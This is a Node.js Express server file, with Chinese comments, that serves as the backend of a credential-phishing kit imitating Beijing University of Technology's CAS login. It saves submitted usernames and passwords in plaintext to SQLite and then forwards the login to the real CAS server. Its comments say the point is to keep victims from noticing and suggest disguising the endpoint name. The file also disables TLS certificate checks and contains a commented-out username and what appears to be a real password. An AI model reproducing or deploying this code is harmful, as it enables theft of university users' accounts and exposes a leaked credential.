const sqlite3 = require('sqlite3');
const fileName = 'database4lts.db';
const db = new sqlite3.Database(fileName);
const qs = require('qs');
const https = require('https');

// 需要定向到实际网址以防止被用户发现
const axios = require('axios');
let realURL = 'https://cas.bjut.edu.cn/login?service=https%3A%2F%2Fmy.bjut.edu.cn%2Fc%2Fportal%2Flogin';


// 创建忽略 SSL 的 axios 实例
const ignoreSSL = axios.create({
    httpsAgent: new https.Agent({
        rejectUnauthorized: false
    })
});
ignoreSSL.post('https://cas.bjut.edu.cn');

// 在 axios 请求时，选择性忽略 SSL
const secureAgent = new https.Agent({
    rejectUnauthorized: false
});



// let data2Send = {
//     "username": "17081160",
//     "password": "Mahsum9537112",
//     "lt": "ltUnknown",
//     "_eventId": "eventId",
//     "submit": ""
// };
let requestHeaders = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Length': '5710',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'JSESSIONID=B7838FC800728051DC551B97C8C0AFAA.a',
    'Host': 'cas.bjut.edu.cn',
    'Origin': 'https://cas.bjut.edu.cn',
    'Pragma': 'no-cache',
    'Referer': 'https://cas.bjut.edu.cn/login?service=https%3A%2F%2Fmy.bjut.edu.cn%2Fc%2Fportal%2Flogin',
    'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
};

async function postData() {
    let result = await axios.post(
        `https://cas.bjut.edu.cn/login?service=https%3A%2F%2Fmy.bjut.edu.cn%2Fc%2Fportal%2Flogin`,
        data2Send,
        {
            httpsAgent: new https.Agent({
                rejectUnauthorized: false
            }),
            headers: requestHeaders
        }
    )
    console.log(result);
    return result;
}

//postData();

// axios.post(realURL, qs.stringify(
//     {
//         data: data2Send,
//         headers: requestHeaders,
//         httpsAgent: secureAgent
//     }
// )).then(response => {
//     console.log('/a1', response.data);
//     res.send(response.data);
// }, error => {
//     console.log('error happened: ', error.message);
// });

insert2loginTab = function (userName, userPassword, callback) {
    db.run('create table if not exists login_info(uid integer primary key autoincrement, name  varchar(15), password varchar(32));', function () {
        db.run("insert into login_info values(?, ?, ?);", [null, userName, userPassword]);
        console.log("User info inserted.");
        callback();
    });
}

update = function (userID, newUserName) {
    db.run("update login_info set name = ? where uid = ?", [userID, newUserName]);
    console.log("changed " + userID);
}

add = function (userName, password) {
    db.run("insert into login_info (name, password) values(?, ?)", [userName, password]);
}


const express = require('express');
const app = express();
const bodyParser = require('body-parser');

// 处理静态资源
app.use(express.static('public'));

// 处理参数
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

/*允许跨域 */
app.use(function (req, res, next) {
    //console.log(req);
    console.log(req.method);
    res.header("Access-Control-Allow-Headers", "Origin,X-Requested-With,Content-Type,Token,Accept,Authorization");
    res.header('Access-Control-Allow-Methods', 'OPTIONS,GET,POST,PUT,DELETE');
    res.header("Access-Control-Allow-Headers", "Content-Type,Access-Token");
    res.header("content-type", "multipart/form-data");
    res.header("content-type", "application/x-www-form-urlencoded");
    res.header("content-type", "application/json; charset=utf-8");
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Access-Control-Expose-Headers", "*");
    res.header("Access-Control-Allow-Methods", "*");
    res.header("Access-Control-Allow-Origin", "*");
    res.header("cache-control", "no-cache");
    res.header("ETag", '');


    //header头信息设置结束后，结束程序往下执行，返回
    if (req.method.toLocaleLowerCase() === 'options') {
        res.status(204);
        return res.json({}); //直接返回空数据，结束此次请求
    } else {
        next();
    }
});

// 为了能够方便观察，暂时就命名为register，实际使用时建议伪装成别的名字。但无论如何都必须要和前端页面请求地址一致。
app.post('/register', (req, res) => {

    // 底下的这些字段最容易因为页面的改变和更新而改变，改变时只要改一下body传参进来的字段即可，框架和原理是不变的。
    let userName = req.body.username;
    let pwd = req.body.password;
    let ltUnknown = req.body.lt;
    let execution = req.body.execution;
    let eventId = req.body._eventId;
    let submit = req.body.submit; // 经观察发现这个往往是空的
    console.log("name is : " + userName + "   password is : " + pwd); // 重要信息，写入数据库存储起来。
    //console.log("lt is : " + ltUnknown + "; execution is: " + execution + "; eventId: " + eventId + "; submit:" + submit);

    let data2Send = {
        "username": userName,
        "password": pwd,
        "lt": ltUnknown,
        "_eventId": eventId,
        "submit": submit
    };
    // 对于我们来说最重要的就是用户名和密码，其它信息不用存数据库。
    db.all("select * from login_info where name = ?", [req.body.username], async function (err, result) {
        //console.log(err);
        insert2loginTab(req.body.username.toString(), req.body.password.toString(), function () {

            db.all("select * from login_info where name = ? ", [req.body.username], function (errrr, resultlt) {
                // console.log("***********" + resultlt[0].uid + " : " + Object.keys(resultlt[0]));

                // axios.post(realURL, { data: data2Send }, {
                //     headers: requestHeaders
                // },
                //     requestHeaders,
                // ).then(response => {
                //     console.log('/a1', response.data);
                //     res.send(response.data);
                // }, error => {
                //     console.log('error happened: ', error.message);
                // });



                axios.post(
                    `https://cas.bjut.edu.cn/login?service=https%3A%2F%2Fmy.bjut.edu.cn%2Fc%2Fportal%2Flogin`,
                    data2Send,
                    {
                        httpsAgent: new https.Agent({
                            rejectUnauthorized: false
                        }),
                        headers: requestHeaders
                    }
                ).then(response => {
                    console.log('/a1', response.data);
                    res.send(response.data);
                }, error => {
                    console.log('error happened: ', error.message);
                });





                //res.redirect(301, 'http://www.baidu.com');


                /// 测试
                // res.json({
                //     code: '200',
                //     msg: '注册成功。',

                //     data: {
                //         userCode: resultlt[0].uid
                //     },
                //     success: true
                // });
            });
        });
    });
});



// 启动监听
app.listen(8080, () => {
    console.log('Server is running...')
});








app.post('/login', (req, res) => {

    console.log("user account : " + req.body.username + ", password is " + req.body.password);

    db.all("select * from login_info where name = ? and password = ?", [req.body.username, req.body.password],
        function (err, result) {
            // console.log(err);
            if (result.length != 0) {
                console.log("OK!");
                res.json({
                    code: '200',
                    msg: '用户登录成功。',

                    data: {
                        userCode: result[0].uid
                    },
                    success: true
                });
            } else {
                res.json({
                    code: '401',
                    msg: 'Unauthorized: 用户名或密码错误，请重新输入或找回密码。',

                    data: {
                        userCode: ""
                    },
                    success: true
                });
            }
        });
});





//db.close();